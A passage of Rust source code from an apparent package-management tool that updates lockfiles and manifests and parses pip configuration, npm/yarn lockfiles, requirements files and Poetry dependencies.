        behavior,
        verdict,
        dependencies: artifact.dependencies.clone(),
        optional_dependencies: artifact.optional_dependencies.clone(),
        grants: artifact.grants.clone(),
        capabilities: artifact.capabilities.clone(),
        verifier_findings,
    };

    if locked.verdict == Verdict::Blocked && !options.record_blocked {
        return Err(OmcRegistryError::BlockedPackage {
            spec: spec.requested(),
        });
    }

    if update_manifest {
        write_manifest_dependency(
            &options.project_dir,
            spec,
            &resolved.version,
            options.save_dev_dependency,
        )?;
    }

    let lockfile = options.project_dir.join(LOCKFILE);
    let mut lock = read_lockfile(&lockfile)?;
    lock.upsert(locked.clone());
    fs::write(&lockfile, toml::to_string_pretty(&lock)?)?;

    let manifest_path = options.project_dir.join(MANIFEST);
    Ok(Some((
        LinkReport {
            locked,
            artifact,
            lockfile,
            manifest: manifest_path,
        },
        dependencies,
    )))
}

fn write_manifest_dependency(
    project_dir: &Path,
    spec: &PackageSpec,
    version: &str,
    dev_dependency: bool,
) -> Result<()> {
    let manifest_path = project_dir.join(MANIFEST);
    let mut manifest = read_manifest(&manifest_path)?;
    if dev_dependency {
        manifest.dependencies.remove(&spec.package_key());
        manifest
            .dev_dependencies
            .insert(spec.package_key(), version.to_owned());
    } else {
        manifest.dev_dependencies.remove(&spec.package_key());
        manifest
            .dependencies
            .insert(spec.package_key(), version.to_owned());
    }
    fs::write(&manifest_path, toml::to_string_pretty(&manifest)?)?;
    Ok(())
}

pub fn read_lockfile(path: impl AsRef<Path>) -> Result<OmcLock> {
    let path = path.as_ref();
    if !path.exists() {
        return Ok(OmcLock::new());
    }
    Ok(toml::from_str(&fs::read_to_string(path)?)?)
}

pub fn read_manifest(path: impl AsRef<Path>) -> Result<OmcManifest> {
    let path = path.as_ref();
    if !path.exists() {
        return Ok(OmcManifest::new("omc-project"));
    }
    Ok(toml::from_str(&fs::read_to_string(path)?)?)
}

fn options_with_manifest_policy(options: &LinkOptions) -> Result<LinkOptions> {
    let mut options = options.clone();
    let manifest = read_manifest(options.project_dir.join(MANIFEST))?;
    apply_manifest_config(&manifest, &mut options)?;
    Ok(options)
}

fn apply_manifest_config(manifest: &OmcManifest, options: &mut LinkOptions) -> Result<()> {
    for grant in &manifest.policy.allow {
        options
            .allowed_capabilities
            .push(parse_capability_grant(grant)?);
    }
    if options.pypi_index_url.is_none() {
        options.pypi_index_url = manifest
            .registries
            .pypi_index_url
            .as_deref()
            .and_then(normalize_pypi_simple_index_url);
    }
    options.pypi_extra_index_urls.extend(
        manifest
            .registries
            .pypi_extra_index_urls
            .iter()
            .filter_map(|index_url| normalize_pypi_simple_index_url(index_url)),
    );
    let manifest_or_explicit_index = options.pypi_index_url.is_some();
    if !manifest_or_explicit_index {
        let project_dir = options.project_dir.clone();
        apply_pip_config_files(&project_dir, options)?;
    }
    apply_pypi_environment_config(options, !manifest_or_explicit_index);
    dedupe_pypi_extra_index_urls(options);
    Ok(())
}

fn apply_pypi_environment_config(options: &mut LinkOptions, override_index: bool) {
    let index_url = env::var("PIP_INDEX_URL").ok();
    let extra_index_urls = env::var("PIP_EXTRA_INDEX_URL").ok();
    let find_links = env::var("PIP_FIND_LINKS").ok();
    let no_index = env_truthy("PIP_NO_INDEX");
    let project_dir = options.project_dir.clone();
    apply_pypi_environment_values(
        options,
        &project_dir,
        index_url.as_deref(),
        extra_index_urls.as_deref(),
        find_links.as_deref(),
        no_index,
        override_index,
    );
}

fn apply_pypi_environment_values(
    options: &mut LinkOptions,
    base_dir: &Path,
    index_url: Option<&str>,
    extra_index_urls: Option<&str>,
    find_links: Option<&str>,
    no_index: bool,
    override_index: bool,
) {
    if override_index || options.pypi_index_url.is_none() {
        if let Some(index_url) = index_url.and_then(normalize_pypi_simple_index_url) {
            options.pypi_index_url = Some(index_url);
        }
    }
    if let Some(extra_index_urls) = extra_index_urls {
        options.pypi_extra_index_urls.extend(
            pypi_index_url_values(extra_index_urls)
                .into_iter()
                .filter_map(|index_url| normalize_pypi_simple_index_url(&index_url)),
        );
    }
    if let Some(find_links) = find_links {
        options.pypi_find_links.extend(
            pypi_index_url_values(find_links)
                .into_iter()
                .filter_map(|find_links| normalize_pypi_find_links_source(&find_links, base_dir)),
        );
    }
    options.pypi_no_index |= no_index;
    dedupe_pypi_find_links(options);
    dedupe_pypi_extra_index_urls(options);
}

#[derive(Debug, Clone, Default, PartialEq, Eq)]
struct PipConfig {
    index_url: Option<String>,
    extra_index_urls: Vec<String>,
    find_links: Vec<String>,
    no_index: bool,
}

fn apply_pip_config_files(project_dir: &Path, options: &mut LinkOptions) -> Result<()> {
    let config = read_pip_config(project_dir)?;
    if options.pypi_index_url.is_none() {
        options.pypi_index_url = config.index_url;
    }
    options
        .pypi_extra_index_urls
        .extend(config.extra_index_urls);
    options.pypi_find_links.extend(config.find_links);
    options.pypi_no_index |= config.no_index;
    dedupe_pypi_find_links(options);
    dedupe_pypi_extra_index_urls(options);
    Ok(())
}

fn read_pip_config(project_dir: &Path) -> Result<PipConfig> {
    let mut config = PipConfig::default();
    if let Some(home) = env::var_os("HOME") {
        let home = PathBuf::from(home);
        read_pip_config_into(&home.join(".pip").join("pip.conf"), &mut config)?;
        read_pip_config_into(
            &home.join(".config").join("pip").join("pip.conf"),
            &mut config,
        )?;
    }
    read_pip_config_into(&project_dir.join("pip.conf"), &mut config)?;
    if let Some(path) = env::var_os("PIP_CONFIG_FILE") {
        read_pip_config_into(&PathBuf::from(path), &mut config)?;
    }
    Ok(config)
}

fn read_pip_config_into(path: &Path, config: &mut PipConfig) -> Result<()> {
    if !path.exists() {
        return Ok(());
    }
    let base_dir = path.parent().unwrap_or_else(|| Path::new("."));
    parse_pip_config_content(&fs::read_to_string(path)?, base_dir, config);
    Ok(())
}

fn parse_pip_config_content(content: &str, base_dir: &Path, config: &mut PipConfig) {
    let mut section = String::new();
    let mut multiline_key: Option<String> = None;
    for raw_line in content.lines() {
        let line = strip_npmrc_comment(raw_line);
        let trimmed = line.trim();
        if trimmed.is_empty() {
            continue;
        }
        if trimmed.starts_with('[') && trimmed.ends_with(']') {
            section = trimmed
                .trim_start_matches('[')
                .trim_end_matches(']')
                .trim()
                .to_ascii_lowercase();
            multiline_key = None;
            continue;
        }
        let indented = raw_line
            .chars()
            .next()
            .map(char::is_whitespace)
            .unwrap_or(false);
        if indented && multiline_key.is_some() && !trimmed.contains('=') {
            if let Some(key) = multiline_key.as_deref() {
                apply_pip_config_value(&section, key, trimmed, base_dir, config);
            }
            continue;
        }
        let Some((key, value)) = trimmed.split_once('=') else {
            multiline_key = None;
            continue;
        };
        let key = key.trim().to_ascii_lowercase();
        let value = value.trim();
        apply_pip_config_value(&section, &key, value, base_dir, config);
        multiline_key = value.is_empty().then_some(key);
    }
}

fn apply_pip_config_value(
    section: &str,
    key: &str,
    value: &str,
    base_dir: &Path,
    config: &mut PipConfig,
) {
    if !matches!(section, "global" | "install") {
        return;
    }
    match key {
        "index-url" => {
            if let Some(index_url) = normalize_pypi_simple_index_url(value) {
                config.index_url = Some(index_url);
            }
        }
        "extra-index-url" => {
            config.extra_index_urls.extend(
                pypi_index_url_values(value)
                    .into_iter()
                    .filter_map(|index_url| normalize_pypi_simple_index_url(&index_url)),
            );
        }
        "find-links" => {
            config.find_links.extend(
                pypi_index_url_values(value)
                    .into_iter()
                    .filter_map(|find_links| {
                        normalize_pypi_find_links_source(&find_links, base_dir)
                    }),
            );
        }
        "no-index" => {
            config.no_index |= pip_config_bool(value);
        }
        _ => {}
    }
    let mut seen = BTreeSet::new();
    config
        .extra_index_urls
        .retain(|index_url| seen.insert(index_url.clone()));
    let mut seen = BTreeSet::new();
    config
        .find_links
        .retain(|find_links| seen.insert(find_links.clone()));
}

fn pypi_index_url_values(value: &str) -> Vec<String> {
    shell_like_tokens(value)
}

fn pip_config_bool(value: &str) -> bool {
    matches!(
        value.trim().to_ascii_lowercase().as_str(),
        "1" | "yes" | "true" | "on"
    )
}

fn env_truthy(name: &str) -> bool {
    env::var(name)
        .ok()
        .map(|value| pip_config_bool(&value))
        .unwrap_or(false)
}

fn dedupe_pypi_extra_index_urls(options: &mut LinkOptions) {
    let mut seen = BTreeSet::new();
    options
        .pypi_extra_index_urls
        .retain(|index_url| seen.insert(index_url.clone()));
}

fn dedupe_pypi_find_links(options: &mut LinkOptions) {
    let mut seen = BTreeSet::new();
    options
        .pypi_find_links
        .retain(|find_links| seen.insert(find_links.clone()));
}

fn prune_lockfile(project_dir: &Path, retained: &BTreeSet<String>) -> Result<usize> {
    let lockfile = project_dir.join(LOCKFILE);
    let mut lock = read_lockfile(&lockfile)?;
    let before = lock.packages.len();
    lock.packages
        .retain(|package| retained.contains(&locked_package_key(package)));
    let removed = before.saturating_sub(lock.packages.len());
    if removed > 0 || before == 0 {
        fs::write(lockfile, toml::to_string_pretty(&lock)?)?;
    }
    Ok(removed)
}

fn locked_package_key(package: &LockedPackage) -> String {
    format!("{}:{}@{}", package.ecosystem, package.name, package.version)
}

fn read_package_json_specs(
    path: &Path,
    include_dev_dependencies: bool,
) -> Result<Vec<PackageSpec>> {
    let package = serde_json::from_str::<ProjectPackageJson>(&fs::read_to_string(path)?)?;
    let workspaces = package.workspaces.clone();
    let mut specs = package_json_dependency_specs(package, include_dev_dependencies);

    if let Some(workspaces) = workspaces {
        let root = path.parent().unwrap_or_else(|| Path::new("."));
        for package_json in workspace_package_json_paths(root, &workspaces) {
            let package =
                serde_json::from_str::<ProjectPackageJson>(&fs::read_to_string(package_json)?)?;
            specs.extend(package_json_dependency_specs(
                package,
                include_dev_dependencies,
            ));
        }
    }

    Ok(specs)
}

fn package_json_dependency_specs(
    package: ProjectPackageJson,
    include_dev_dependencies: bool,
) -> Vec<PackageSpec> {
    let mut specs = Vec::new();
    let dev_dependencies = if include_dev_dependencies {
        package.dev_dependencies
    } else {
        BTreeMap::new()
    };

    for dependencies in [
        package.dependencies,
        dev_dependencies,
        package.optional_dependencies,
        required_peer_dependencies(package.peer_dependencies, package.peer_dependencies_meta),
    ] {
        for (name, requirement) in dependencies {
            specs.push(PackageSpec::new(Ecosystem::Npm, name, Some(requirement)));
        }
    }

    specs
}

fn workspace_package_json_paths(root: &Path, workspaces: &ProjectWorkspaces) -> Vec<PathBuf> {
    let mut includes = Vec::new();
    let mut excludes = Vec::new();
    for pattern in workspaces.patterns() {
        let pattern = pattern.trim();
        if pattern.is_empty() {
            continue;
        }
        if let Some(exclude) = pattern.strip_prefix('!') {
            excludes.push(exclude.trim());
        } else {
            includes.push(pattern);
        }
    }

    if includes.is_empty() {
        return Vec::new();
    }

    let root_package_json = root.join("package.json");
    let mut package_json_paths = Vec::new();
    let mut seen = BTreeSet::new();

    for entry in WalkDir::new(root)
        .follow_links(false)
        .into_iter()
        .filter_entry(should_enter_workspace_dir)
        .filter_map(std::result::Result::ok)
    {
        if !entry.file_type().is_file() || entry.file_name() != "package.json" {
            continue;
        }

        let package_json = entry.path();
        if package_json == root_package_json {
            continue;
        }

        let Some(package_dir) = package_json.parent() else {
            continue;
        };
        let Ok(relative_dir) = package_dir.strip_prefix(root) else {
            continue;
        };

        if workspace_patterns_match(&includes, &excludes, relative_dir) {
            let package_json = package_json.to_path_buf();
            if seen.insert(package_json.clone()) {
                package_json_paths.push(package_json);
            }
        }
    }

    package_json_paths
}

fn should_enter_workspace_dir(entry: &DirEntry) -> bool {
    if entry.depth() == 0 || !entry.file_type().is_dir() {
        return true;
    }

    !matches!(
        entry.file_name().to_str(),
        Some("node_modules" | ".git" | ".omc")
    )
}

fn workspace_patterns_match(includes: &[&str], excludes: &[&str], relative_dir: &Path) -> bool {
    let segments = path_segments(relative_dir);
    includes
        .iter()
        .any(|pattern| workspace_pattern_matches(pattern, &segments))
        && !excludes
            .iter()
            .any(|pattern| workspace_pattern_matches(pattern, &segments))
}

fn workspace_pattern_matches(pattern: &str, path_segments: &[String]) -> bool {
    let pattern_segments = workspace_pattern_segments(pattern);
    workspace_segments_match(&pattern_segments, path_segments)
}

fn workspace_pattern_segments(pattern: &str) -> Vec<&str> {
    let pattern = pattern
        .trim()
        .trim_start_matches("./")
        .trim_end_matches('/')
        .trim_end_matches('\\');
    let pattern = pattern.strip_suffix("/package.json").unwrap_or(pattern);
    let pattern = pattern.strip_suffix("\\package.json").unwrap_or(pattern);

    pattern
        .split(['/', '\\'])
        .filter(|segment| !segment.is_empty())
        .collect()
}

fn path_segments(path: &Path) -> Vec<String> {
    path.components()
        .filter_map(|component| match component {
            std::path::Component::Normal(segment) => {
                segment.to_str().map(std::borrow::ToOwned::to_owned)
            }
            _ => None,
        })
        .collect()
}

fn workspace_segments_match(pattern_segments: &[&str], path_segments: &[String]) -> bool {
    let Some((pattern_segment, remaining_pattern)) = pattern_segments.split_first() else {
        return path_segments.is_empty();
    };

    if *pattern_segment == "**" {
        return workspace_segments_match(remaining_pattern, path_segments)
            || (!path_segments.is_empty()
                && workspace_segments_match(pattern_segments, &path_segments[1..]));
    }

    let Some((path_segment, remaining_path)) = path_segments.split_first() else {
        return false;
    };

    workspace_segment_matches(pattern_segment, path_segment)
        && workspace_segments_match(remaining_pattern, remaining_path)
}

fn workspace_segment_matches(pattern: &str, value: &str) -> bool {
    if !pattern.contains('*') {
        return pattern == value;
    }

    let starts_with_star = pattern.starts_with('*');
    let ends_with_star = pattern.ends_with('*');
    let mut rest = value;
    let mut first = true;
    let mut matched_any_part = false;

    for part in pattern.split('*').filter(|part| !part.is_empty()) {
        matched_any_part = true;
        if first && !starts_with_star {
            let Some(next) = rest.strip_prefix(part) else {
                return false;
            };
            rest = next;
        } else {
            let Some(index) = rest.find(part) else {
                return false;
            };
            rest = &rest[index + part.len()..];
        }
        first = false;
    }

    if !matched_any_part {
        return true;
    }

    if !ends_with_star {
        if let Some(last_part) = pattern.rsplit('*').find(|part| !part.is_empty()) {
            return value.ends_with(last_part);
        }
    }

    true
}

fn required_peer_dependencies(
    peer_dependencies: BTreeMap<String, String>,
    peer_dependencies_meta: BTreeMap<String, NpmPeerDependencyMeta>,
) -> BTreeMap<String, String> {
    peer_dependencies
        .into_iter()
        .filter(|(name, _)| {
            !peer_dependencies_meta
                .get(name)
                .map(|meta| meta.optional)
                .unwrap_or(false)
        })
        .collect()
}

fn read_package_lock_requirements(path: &Path) -> Result<ProjectRequirements> {
    let lock = serde_json::from_str::<NpmPackageLock>(&fs::read_to_string(path)?)?;
    let mut versions = BTreeMap::<String, BTreeSet<String>>::new();
    let mut integrities = BTreeMap::<String, BTreeSet<String>>::new();
    let mut resolved = BTreeMap::<String, BTreeSet<String>>::new();

    for (path, package) in lock.packages {
        if path.is_empty() {
            continue;
        }
        let Some(name) = npm_package_name_from_lock_path(&path) else {
            continue;
        };
        if let Some(version) = package.version {
            versions.entry(name.clone()).or_default().insert(version);
        }
        if let Some(integrity) = package.integrity {
            integrities
                .entry(name.clone())
                .or_default()
                .insert(integrity);
        }
        if let Some(url) = package.resolved {
            resolved.entry(name).or_default().insert(url);
        }
    }

    collect_npm_lock_dependency_requirements(
        lock.dependencies,
        &mut versions,
        &mut integrities,
        &mut resolved,
    );

    Ok(npm_requirements_from_lock_maps(
        versions,
        integrities,
        resolved,
    ))
}

fn read_yarn_lock_requirements(path: &Path) -> Result<ProjectRequirements> {
    let content = fs::read_to_string(path)?;
    let mut versions = BTreeMap::<String, BTreeSet<String>>::new();
    let mut integrities = BTreeMap::<String, BTreeSet<String>>::new();
    let mut resolved = BTreeMap::<String, BTreeSet<String>>::new();
    let mut entry: Option<YarnLockEntry> = None;

    for line in content.lines() {
        let line = line.trim_end();
        let trimmed = line.trim();
        if trimmed.is_empty() || trimmed.starts_with('#') {
            continue;
        }

        let starts_indented = line
            .chars()
            .next()
            .map(char::is_whitespace)
            .unwrap_or(false);
        if !starts_indented && trimmed.ends_with(':') {
            collect_yarn_lock_entry(entry.take(), &mut versions, &mut integrities, &mut resolved);
            entry = Some(YarnLockEntry {
                selectors: parse_yarn_lock_selectors(trimmed.trim_end_matches(':')),
                version: None,
                resolved: None,
                integrity: None,
            });
            continue;
        }

        let Some(entry) = entry.as_mut() else {
            continue;
        };
        if let Some(value) = trimmed.strip_prefix("version ") {
            entry.version = Some(yarn_lock_value(value));
        } else if let Some(value) = trimmed.strip_prefix("resolved ") {
            entry.resolved = Some(yarn_lock_value(value));
        } else if let Some(value) = trimmed.strip_prefix("integrity ") {
            entry.integrity = Some(yarn_lock_value(value));
        }
    }

    collect_yarn_lock_entry(entry, &mut versions, &mut integrities, &mut resolved);

    Ok(npm_requirements_from_lock_maps(
        versions,
        integrities,
        resolved,
    ))
}

fn collect_yarn_lock_entry(
    entry: Option<YarnLockEntry>,
    versions: &mut BTreeMap<String, BTreeSet<String>>,
    integrities: &mut BTreeMap<String, BTreeSet<String>>,
    resolved: &mut BTreeMap<String, BTreeSet<String>>,
) {
    let Some(entry) = entry else {
        return;
    };
    let Some(version) = entry.version else {
        return;
    };

    for selector in entry.selectors {
        let Some(name) = npm_package_name_from_yarn_selector(&selector) else {
            continue;
        };
        versions
            .entry(name.clone())
            .or_default()
            .insert(version.clone());
        if let Some(integrity) = &entry.integrity {
            integrities
                .entry(name.clone())
                .or_default()
                .insert(integrity.clone());
        }
        if let Some(url) = entry
            .resolved
            .as_deref()
            .filter(|url| url.starts_with("https://"))
        {
            resolved.entry(name).or_default().insert(url.to_owned());
        }
    }
}

fn parse_yarn_lock_selectors(raw: &str) -> Vec<String> {
    let mut selectors = Vec::new();
    let mut current = String::new();
    let mut in_quote = false;
    let mut escaped = false;

    for character in raw.chars() {
        if escaped {
            current.push(character);
            escaped = false;
            continue;
        }
        if in_quote && character == '\\' {
            escaped = true;
            continue;
        }
        if character == '"' {
            in_quote = !in_quote;
            continue;
        }
        if character == ',' && !in_quote {
            let selector = current.trim();
            if !selector.is_empty() {
                selectors.push(selector.to_owned());
            }
            current.clear();
            continue;
        }
        current.push(character);
    }

    let selector = current.trim();
    if !selector.is_empty() {
        selectors.push(selector.to_owned());
    }

    selectors
}

fn yarn_lock_value(value: &str) -> String {
    let value = value.trim();
    if value.len() >= 2 && value.starts_with('"') && value.ends_with('"') {
        value[1..value.len() - 1]
            .replace("\\\"", "\"")
            .replace("\\\\", "\\")
    } else {
        value.to_owned()
    }
}

fn npm_package_name_from_yarn_selector(selector: &str) -> Option<String> {
    let selector = selector.trim();
    if selector.is_empty() {
        return None;
    }

    if let Some((alias, _)) = selector.split_once("@npm:") {
        return if alias.is_empty() {
            None
        } else {
            Some(alias.to_owned())
        };
    }

    let version_separator = selector.rfind('@')?;
    if version_separator == 0 && selector.starts_with('@') {
        return None;
    }
    Some(selector[..version_separator].to_owned())
}

fn npm_requirements_from_lock_maps(
    versions: BTreeMap<String, BTreeSet<String>>,
    integrities: BTreeMap<String, BTreeSet<String>>,
    resolved: BTreeMap<String, BTreeSet<String>>,
) -> ProjectRequirements {
    let constraints = versions
        .into_iter()
        .filter_map(|(name, versions)| {
            if versions.len() == 1 {
                versions
                    .into_iter()
                    .next()
                    .map(|version| (format!("npm:{name}"), version))
            } else {
                None
            }
        })
        .collect::<BTreeMap<_, _>>();
    let npm_integrities = integrities
        .into_iter()
        .filter(|(name, _)| constraints.contains_key(&format!("npm:{name}")))
        .map(|(name, values)| (format!("npm:{name}"), values))
        .collect();
    let npm_resolved = resolved
        .into_iter()
        .filter_map(|(name, values)| {
            let key = format!("npm:{name}");
            if constraints.contains_key(&key) && values.len() == 1 {
                values.into_iter().next().map(|url| (key, url))
            } else {
                None
            }
        })
        .collect();

    ProjectRequirements {
        specs: Vec::new(),
        constraints,
        hashes: BTreeMap::new(),
        npm_integrities,
        npm_resolved,
        pypi_index_url: None,
        pypi_extra_index_urls: Vec::new(),
        pypi_find_links: Vec::new(),
        pypi_no_index: false,
    }
}

fn collect_npm_lock_dependency_requirements(
    dependencies: BTreeMap<String, NpmPackageLockDependency>,
    versions: &mut BTreeMap<String, BTreeSet<String>>,
    integrities: &mut BTreeMap<String, BTreeSet<String>>,
    resolved: &mut BTreeMap<String, BTreeSet<String>>,
) {
    for (name, dependency) in dependencies {
        if let Some(version) = dependency.version {
            versions.entry(name.clone()).or_default().insert(version);
        }
        if let Some(integrity) = dependency.integrity {
            integrities
                .entry(name.clone())
                .or_default()
                .insert(integrity);
        }
        if let Some(url) = dependency.resolved {
            resolved.entry(name).or_default().insert(url);
        }
        collect_npm_lock_dependency_requirements(
            dependency.dependencies,
            versions,
            integrities,
            resolved,
        );
    }
}

fn npm_package_name_from_lock_path(path: &str) -> Option<String> {
    let mut components = path.split('/').peekable();
    let mut name = None;

    while let Some(component) = components.next() {
        if component != "node_modules" {
            continue;
        }
        let package = components.next()?;
        if package.starts_with('@') {
            let scoped = components.next()?;
            name = Some(format!("{package}/{scoped}"));
        } else {
            name = Some(package.to_owned());
        }
    }

    name
}

fn read_requirements_file(path: &Path) -> Result<ProjectRequirements> {
    let mut discovered = ProjectRequirements::default();
    read_requirements_file_inner(
        path,
        RequirementsMode::Install,
        &mut BTreeSet::new(),
        &mut discovered,
    )?;
    Ok(discovered)
}

fn read_pyproject_requirements(
    path: &Path,
    project_extras: &BTreeSet<String>,
    include_dev_dependencies: bool,
) -> Result<ProjectRequirements> {
    let pyproject = toml::from_str::<PyProjectToml>(&fs::read_to_string(path)?)?;
    let mut discovered = ProjectRequirements::default();

    if let Some(project) = pyproject.project {
        for dependency in project.dependencies {
            if let Some(spec) = parse_pypi_requirement(&dependency) {
                discovered.specs.push(spec);
            }
        }

        let optional_dependencies = project
            .optional_dependencies
            .into_iter()
            .map(|(extra, dependencies)| (normalize_pypi_extra(&extra), dependencies))
            .collect::<BTreeMap<_, _>>();

        for extra in project_extras {
            if let Some(dependencies) = optional_dependencies.get(extra) {
                for dependency in dependencies {
                    if let Some(spec) =
                        parse_pypi_requirement_with_extras(dependency, project_extras)
                    {
                        discovered.specs.push(spec);
                    }
                }
            }
        }
    }

    if let Some(poetry) = pyproject.tool.and_then(|tool| tool.poetry) {
        let base_dir = path.parent().unwrap_or_else(|| Path::new("."));
        discovered.specs.extend(read_poetry_dependencies(
            &poetry.dependencies,
            &poetry.extras,
            project_extras,
            base_dir,
        )?);

        if include_dev_dependencies {
            discovered.specs.extend(read_poetry_dependencies(
                &poetry.dev_dependencies,
                &BTreeMap::new(),
                &BTreeSet::new(),
                base_dir,
            )?);
        }

        for (group_name, group) in poetry.group {
            let group_name = normalize_pypi_extra(&group_name);
            let include_group = if group_name == "dev" {
                include_dev_dependencies
            } else if group.optional {
                project_extras.contains(&group_name)
            } else {
                true
            };

            if include_group {
                discovered.specs.extend(read_poetry_dependencies(
                    &group.dependencies,
                    &BTreeMap::new(),
                    &BTreeSet::new(),
                    base_dir,
                )?);
            }
        }
    }

    Ok(discovered)
}

fn read_poetry_dependencies(
    dependencies: &BTreeMap<String, PoetryDependency>,
    extras: &BTreeMap<String, Vec<String>>,
    project_extras: &BTreeSet<String>,
    base_dir: &Path,
) -> Result<Vec<PackageSpec>> {
    let selected_optional_names = extras
        .iter()
        .filter(|(extra, _)| project_extras.contains(&normalize_pypi_extra(extra)))
        .flat_map(|(_, names)| names.iter().map(|name| normalize_pypi_name(name)))
        .collect::<BTreeSet<_>>();
    let mut specs = Vec::new();

    for (name, dependency) in dependencies {
        let name = normalize_pypi_name(name);
        if name == "python" {
            continue;
        }
        if poetry_dependency_optional(dependency) && !selected_optional_names.contains(&name) {
            continue;
        }
        if let Some(spec) = poetry_dependency_spec(&name, dependency, base_dir)? {
            specs.push(spec);
        }
    }

    Ok(specs)
}

fn read_poetry_lock_requirements(path: &Path) -> Result<ProjectRequirements> {
    let lock = toml::from_str::<PoetryLock>(&fs::read_to_string(path)?)?;
    let mut requirements = ProjectRequirements::default();

    for package in lock.package {
        let name = normalize_pypi_name(&package.name);
        let key = format!("pypi:{name}");
        requirements
            .constraints
            .insert(key.clone(), package.version);
        for file in package.files {
            if let Some(hash) = normalize_sha256_hash(&file.hash) {
                requirements
                    .hashes
                    .entry(key.clone())
                    .or_default()
                    .insert(hash);
            }
        }
    }

    for (name, files) in lock.metadata.files {
        let key = format!("pypi:{}", normalize_pypi_name(&name));
        for file in files {
            if let Some(hash) = normalize_sha256_hash(&file.hash) {
                requirements
                    .hashes
                    .entry(key.clone())
                    .or_default()
                    .insert(hash);
            }
        }
    }

    Ok(requirements)
}

fn poetry_dependency_optional(dependency: &PoetryDependency) -> bool {
    match dependency {
        PoetryDependency::Version(_) => false,
        PoetryDependency::Table(table) => table.optional,
    }
}

fn poetry_dependency_spec(
    name: &str,
    dependency: &PoetryDependency,
    base_dir: &Path,
) -> Result<Option<PackageSpec>> {
    let version = match dependency {
        PoetryDependency::Version(version) => version.as_str(),
        PoetryDependency::Table(table) => {
            if table.git.is_some() {
                return Err(OmcRegistryError::UnsupportedSpec(format!(
                    "unsupported Poetry dependency source for `{name}`"
                )));
            }
            if let Some(url) = &table.url {
                return Ok(Some(PackageSpec::with_direct_url(
                    Ecosystem::Pypi,
                    name.to_owned(),
                    url.to_owned(),
                    BTreeSet::new(),
                )));
            }
            if let Some(path) = table.file.as_deref().or(table.path.as_deref()) {
                return poetry_local_wheel_dependency_spec(name, path, base_dir).map(Some);
            }
            table.version.as_deref().unwrap_or("*")
        }
    };
    Ok(poetry_version_requirement(name, version).map(|version| {
        PackageSpec::new(
            Ecosystem::Pypi,
            name.to_owned(),
            (!version.is_empty()).then_some(version),
        )
    }))
}

fn poetry_local_wheel_dependency_spec(
    name: &str,
    path: &str,
    base_dir: &Path,
) -> Result<PackageSpec> {
    let path = Path::new(path);
    let path = if path.is_absolute() {
        path.to_path_buf()
    } else {
        base_dir.join(path)
    };
    if path.extension().and_then(|ext| ext.to_str()) != Some("whl") {
        return Err(OmcRegistryError::UnsupportedSpec(format!(
            "unsupported Poetry dependency source for `{name}`"
        )));
    }
    let url = reqwest::Url::from_file_path(&path).map_err(|_| {
        OmcRegistryError::UnsupportedSpec(format!(
            "unsupported Poetry dependency source for `{name}`"
        ))
    })?;
    Ok(PackageSpec::with_direct_url(
        Ecosystem::Pypi,
        name.to_owned(),
        url.to_string(),
        BTreeSet::new(),
    ))
}

fn poetry_version_requirement(_name: &str, version: &str) -> Option<String> {
    let version = version.trim();
    if version.is_empty() {
        return None;
    }
    if version == "*" {
        return Some(String::new());
    }
    if let Some(base) = version.strip_prefix('^') {
        return poetry_caret_requirement(base);
    }
    if let Some(base) = version.strip_prefix('~') {
        return poetry_tilde_requirement(base);
    }
    Some(version.replace(' ', ""))
}

fn poetry_caret_requirement(base: &str) -> Option<String> {
    let lower = normalize_poetry_partial_version(base)?;
    let parts = version_parts(&lower);
    let upper = match parts.as_slice() {
        [0, 0, patch, ..] => format!("0.0.{}", patch + 1),
        [0, minor, ..] => format!("0.{}", minor + 1),
        [major, ..] => format!("{}", major + 1),
        _ => return None,
    };
    Some(format!(">={lower},<{upper}"))
}

fn poetry_tilde_requirement(base: &str) -> Option<String> {
    let lower = normalize_poetry_partial_version(base)?;
    let parts = version_parts(&lower);
    let upper = match parts.as_slice() {
        [major] => format!("{}", major + 1),
        [major, minor, ..] => format!("{}.{}", major, minor + 1),
        _ => return None,
    };
    Some(format!(">={lower},<{upper}"))
}

fn normalize_poetry_partial_version(version: &str) -> Option<String> {
    let parts = version_parts(version);
    if parts.is_empty() {
        None
    } else {
        Some(
            parts
                .iter()
                .map(ToString::to_string)
                .collect::<Vec<_>>()
                .join("."),
        )
    }
}

fn version_parts(version: &str) -> Vec<u64> {
    version
        .split('.')
        .filter_map(|part| part.parse::<u64>().ok())
        .collect()
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
enum RequirementsMode {
    Install,
    Constraint,
}

#[derive(Debug, Clone)]
struct RequirementsInclude {
    path: String,
    mode: RequirementsMode,
}

fn read_requirements_file_inner(
    path: &Path,
    mode: RequirementsMode,
    seen: &mut BTreeSet<(RequirementsMode, PathBuf)>,
    discovered: &mut ProjectRequirements,
) -> Result<()> {
    let seen_key = fs::canonicalize(path).unwrap_or_else(|_| path.to_path_buf());
    if !seen.insert((mode, seen_key)) {
        return Ok(());
    }

    let base_dir = path.parent().unwrap_or_else(|| Path::new("."));
    for raw_line in requirement_logical_lines(&fs::read_to_string(path)?) {
        let line = raw_line.trim();
        if line.is_empty() {
            continue;
        }

        if let Some(include) = parse_requirements_include(line) {
            read_requirements_file_inner(
                &base_dir.join(include.path),
                include.mode,
                seen,
                discovered,
            )?;
            continue;
        }

        if let Some(index_url) = parse_requirements_index_url(line) {
            if mode == RequirementsMode::Install {
                discovered.pypi_index_url = Some(index_url);
            }
            continue;
        }

        if let Some(index_url) = parse_requirements_extra_index_url(line) {
            if mode == RequirementsMode::Install {
                discovered.pypi_extra_index_urls.push(index_url);
            }
            continue;
        }

        if let Some(find_links) = parse_requirements_find_links(line, base_dir) {
            if mode == RequirementsMode::Install {
                discovered.pypi_find_links.push(find_links);
            }
            continue;
        }

        if parse_requirements_no_index(line) {
            if mode == RequirementsMode::Install {
                discovered.pypi_no_index = true;
            }
            continue;
        }

        if line.starts_with('-') {
            return Err(OmcRegistryError::UnsupportedRequirement(line.to_owned()));
        }

        let parsed = parse_requirement_line(line);
        if let Some((spec, hashes)) =
            parse_pypi_direct_requirement(&parsed.requirement, &BTreeSet::new())
        {
            if mode == RequirementsMode::Constraint {
                return Err(OmcRegistryError::UnsupportedRequirement(line.to_owned()));
            }
            if !parsed.hashes.is_empty() || !hashes.is_empty() {
                discovered
                    .hashes
                    .entry(spec.constraint_key())
                    .or_default()
                    .extend(parsed.hashes.into_iter().chain(hashes));
            }
            discovered.specs.push(spec);
            continue;
        }

        if parsed.requirement.contains("://") {
            return Err(OmcRegistryError::UnsupportedRequirement(line.to_owned()));
        }

